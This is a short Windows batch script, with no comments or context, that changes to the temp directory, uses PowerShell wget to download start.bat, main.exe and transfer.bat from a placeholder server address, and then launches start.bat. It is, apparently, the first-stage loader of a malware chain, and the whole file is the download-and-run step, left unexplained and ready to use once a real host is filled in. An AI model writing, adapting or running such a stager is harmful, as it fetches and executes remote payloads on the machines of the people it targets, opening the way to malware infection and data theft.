@echo off

cd %temp%
powershell wget "http://<server-ip>/start.bat" -O "start.bat"
powershell wget "http://<server-ip>/main.exe" -O "main.exe"
powershell wget "http://<server-ip>/transfer.bat" -O "transfer.bat"

start start.bat
